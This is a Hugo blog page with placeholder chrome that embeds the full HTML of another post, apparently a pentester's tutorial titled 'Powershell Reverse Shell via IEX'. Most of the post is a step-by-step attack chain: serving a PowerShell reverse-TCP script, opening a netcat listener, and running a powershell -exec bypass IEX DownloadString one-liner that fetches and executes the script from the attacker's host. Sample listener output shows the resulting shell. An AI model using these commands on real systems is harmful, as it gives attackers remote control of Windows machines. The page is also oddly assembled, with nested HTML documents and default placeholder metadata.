<!doctype html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title> // My Blog</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.126.3">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
    

    
  


    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="My Blog">
  <meta name="twitter:description" content="&lt;!DOCTYPE html&gt; Powershell Reverse Shell via IEX Andr01ds Blog Powershell Reverse Shell via IEX April 14, 2023 When you ware working in a Windows environment, whether Active Directory is involved or not, there will come a time when you need a reverse shell, and most reverse shells from Pentest Monkey arent going to work in your situation. Gaining RCE on a Windows box typically means you have access to either cmd or Powershell.">

    <meta property="og:url" content="http://localhost:1313/blog/posh_reverse/">
  <meta property="og:site_name" content="My Blog">
  <meta property="og:title" content="My Blog">
  <meta property="og:description" content="&lt;!DOCTYPE html&gt; Powershell Reverse Shell via IEX Andr01ds Blog Powershell Reverse Shell via IEX April 14, 2023 When you ware working in a Windows environment, whether Active Directory is involved or not, there will come a time when you need a reverse shell, and most reverse shells from Pentest Monkey arent going to work in your situation. Gaining RCE on a Windows box typically means you have access to either cmd or Powershell.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">


  </head>
  <body>
    <header class="app-header">
      <a href="http://localhost:1313/"><img class="app-header-avatar" src="/avatar.jpg" alt="John Doe" /></a>
      <span class="app-header-title">My Blog</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/blog/">Blog</a>
      </nav>
      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc vehicula turpis sit amet elit pretium.</p>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title"></h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jan 1, 0001
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          2 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Just a standard blog">
    
    <link rel="shortcut icon" href="https://rtandr01d.net/favicon.ico">
    
    <link rel="stylesheet" href="/css/style.min.css">

    <link rel="canonical" href="https://rtandr01d.net/posts/posh_reverse/" />
    <title>Powershell Reverse Shell via IEX</title>
</head>
<body><header id="banner">
    <h2><a href="https://rtandr01d.net">Andr01ds Blog</a></h2>
    <nav>
        <ul>
            
        </ul>
    </nav>
</header>
<main id="content">
<article>
    <header id="post-header">
        <h1>Powershell Reverse Shell via IEX</h1>
        <div>
                <time>April 14, 2023</time>
            </div>
    </header><p>When you ware working in a Windows environment, whether Active Directory is involved or not,
there will come a time when you need a reverse shell, and most reverse shells from Pentest Monkey
arent going to work in your situation. Gaining RCE on a Windows box typically means you have access
to either cmd or Powershell. Getting a reliable shell can give some trouble, but luckily, Powershell
has the ability to call and run Powershell scripts remotely without dropping anything on disk.
First, we need a powershell reverse-tcp script. Luckily, samratashok on github has Invoke-PowerShellTCP.ps1
For this to work well, we need to add a line to the end of the powershell script. For example:</p>
<p><code>Invoke-PowerShellTcp -Reverse -IPAddress X.X.X.X -Port 4444</code></p>
<p>where ‘X.X.X.X’ is the IP address for the reverse shell to connect to. In order for our
target machine to be able to grab our Powershell script, we need to start up a webserver. I am partial
to using the easy python webserver, so we start it up using:</p>
<p><code>python -m SimpleHTTPServer 80</code></p>
<p>We will need a listener on our local machine for the reverse shell to connect back to, so lets start up
a netcat listener:</p>
<p><code>netcat -lnvp 4444</code></p>
<p>Next, we need to call this powershell script from our RCE on the Windows box. To call this script remotely,
we need to run this on the Windows machine:</p>
<p><code>powershell.exe -exec bypass iex(New-Object Net.WebClient).DownloadString(‘http://X.X.X.X/InvokePowerShellTcp.ps1')</code></p>
<p>If we are lucky, this will now throw a reverse Powershell instance back to our netcat listener</p>
<pre tabindex="0"><code>root@kali:~# nc -lnvp 4444
listening on [any] 4444
connecting to [X.X.X.X] from (UNKNOWN) [X.X.X.X] 47907
Windows PowerShell running as user MS01$ on MS01 Copyright © 2015 Microsoft Corporation. All right reserved.
</code></pre></article>

        </main><footer id="footer">
    @andr01d@defcon.social
</footer>
</body>
</html>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
